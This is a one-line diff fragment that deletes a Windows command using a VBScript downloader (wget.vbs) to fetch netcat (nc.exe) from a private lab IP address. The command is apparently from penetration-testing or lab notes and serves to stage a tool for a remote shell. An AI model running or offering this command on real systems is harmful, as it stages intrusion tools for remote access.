@@ -1,1 +1,0 @@
-cscript wget.vbs http://10.11.0.172/nc.exe nc.exe
